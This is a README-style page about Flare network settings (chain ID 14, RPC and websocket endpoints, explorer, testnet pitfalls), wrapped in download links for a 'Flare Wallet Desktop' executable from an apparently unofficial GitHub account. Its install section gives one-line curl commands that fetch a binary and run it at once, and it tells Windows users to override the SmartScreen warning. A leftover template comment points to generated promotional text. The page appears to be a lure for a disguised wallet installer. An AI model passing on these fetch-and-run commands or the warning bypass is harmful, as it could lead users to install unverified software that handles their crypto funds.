![Flare Wallet](assets/banner-article.png)

# Flare Wallet Network Settings: Chain ID, RPC and Adding Flare

The four fields that put any wallet on Flare mainnet, and the testnet trap.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Flare mainnet is already configured in the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02); the fields below are for other wallets and for verifying what your installation points at.

> A wallet on the wrong chain is not broken. It is looking at a different network, where your address simply has no balance.

Flare mainnet uses chain ID 14, the native token FLR with 18 decimals, the RPC endpoint `flare-api.flare.network/ext/C/rpc` and the explorer `flare-explorer.flare.network`. Flare Wallet ships with all of that configured at install, so the fields here matter when you are adding Flare to another wallet or checking which network you are on.

<!-- ARTICLE-BODY-BEGIN -->

## The settings, ready to copy

| Setting | Value |
| --- | --- |
| Network name | Flare Mainnet |
| Chain ID | 14 (`0xe`) |
| Native currency | FLR |
| Decimals | 18 |
| HTTPS RPC | `flare-api.flare.network/ext/C/rpc` |
| WSS RPC | `flare-api.flare.network/ext/C/ws` |
| Block explorer | `flare-explorer.flare.network` |

Those are the four fields any EVM wallet asks for, plus the explorer that lets you check the result. The WSS endpoint is the same network over a websocket, used by interfaces that subscribe to live events. If you have not installed the wallet yet, start with <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">Flare Wallet download</a>, because the desktop build arrives already pointed at these values.

## Why the chain ID is the field that matters

Chain ID 14 is what tells a wallet which network it is talking to. An address that exists on Flare also exists on other EVM chains with a different balance, so the same string of characters can show two very different portfolios depending on the chain you selected.

When a wallet shows zero after a transfer, the chain ID is the first thing to check, before any support conversation. The transaction is on the chain it was sent to; the question is whether the window is looking at that chain.

## Adding Flare to another wallet

Any EVM wallet accepts the same four fields. Enter the network name, chain ID 14, FLR as the symbol with 18 decimals, and the RPC above, prefixed with the https scheme, then save and switch to it. If the wallet offers to import settings from a chain list, verify afterwards that the chain ID it saved is 14 rather than accepting the import blindly.

On a phone, the same fields apply; the difference is only where the form lives. Some mobile wallets hide network management behind an advanced setting, which is why "the network option is missing" is usually a navigation problem rather than an unsupported feature.

## Switching networks inside Flare Wallet Desktop

You do not need to. The desktop wallet is configured for Flare mainnet at install, with chain ID 14 and the public RPC already set. Manual network entry exists for the case where you want to use these fields somewhere else.

If a screen asks you to choose a network, confirm the chain ID reads 14 before signing anything. A transaction signed on the wrong chain either fails or lands somewhere you did not intend.

## Testnets and the balance that disappears

Coston2 is Flare's testnet and Songbird is the canary network. Both use FLR-shaped tokens that are not real FLR and carry no value. A wallet pointed at a testnet will show a balance that looks like yours and cannot be spent on mainnet.

That is the most common false alarm in this account: a reader adds a network, sees a number, and later finds nothing on mainnet because the number was test currency. Check the chain ID, not the balance.

## When the settings look right and nothing appears

Confirm the address, then confirm the chain, then open the explorer and look the address up directly. If the explorer shows the balance, the wallet is reading correctly and the problem is display or cache. If the explorer also shows nothing, the funds are on a different address or a different chain.

The full diagnostic order is in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md">Flare Wallet not syncing</a>, and the address side of the check, including what an address can and cannot reveal, is in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-address.md">Flare Wallet address</a>. If the wallet itself is missing or out of date, reinstall from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> and confirm chain ID 14 on first run.

## FAQ

### What is the Flare mainnet chain ID?

14, written as `0xe` in hexadecimal. It is the value that separates Flare mainnet from Coston2, Songbird and other EVM networks in the same wallet.

### Which RPC endpoint does Flare Wallet Desktop use?

The public Flare endpoint at `flare-api.flare.network/ext/C/rpc`, configured at install. Flare also publishes a websocket endpoint at `flare-api.flare.network/ext/C/ws` for interfaces that need live subscriptions.

### How do I add the Flare network to another wallet?

Enter network name Flare Mainnet, chain ID 14, symbol FLR, 18 decimals and the RPC above, prefixed with the https scheme, then save and switch. Confirm the saved chain ID afterwards rather than trusting the import.

### Can I add Flare from a phone?

Yes, with the same four fields; only the location of the form differs. If you cannot find network management, it is usually behind an advanced or developer setting rather than missing.

### How do I change networks in another wallet?

Open its network selector and choose the Flare entry you added. If Flare is absent, add it with the fields above first; a wallet cannot switch to a network it has never been given.

### Why does my wallet show no balance after I switched?

Either the chain ID is not 14, or the address has nothing on this chain. Check the address on the explorer before changing anything else, because the explorer is the ledger and the wallet is a window onto it.

### How do I switch networks in Flare Wallet Desktop?

There is nothing to switch for Flare: the desktop wallet is configured for mainnet at install. Manual entry is for other wallets, which is why the fields on this page are worth keeping.

### Can I use the wrong RPC endpoint?

Any endpoint that serves Flare mainnet works, but a third-party endpoint can be slow, rate-limited or dishonest about chain state, and a wallet trusts whatever its endpoint reports. If a balance looks wrong on a custom endpoint, try the public one before believing it.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet download](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [Flare Wallet not syncing](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md) | [Flare Wallet address](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-address.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
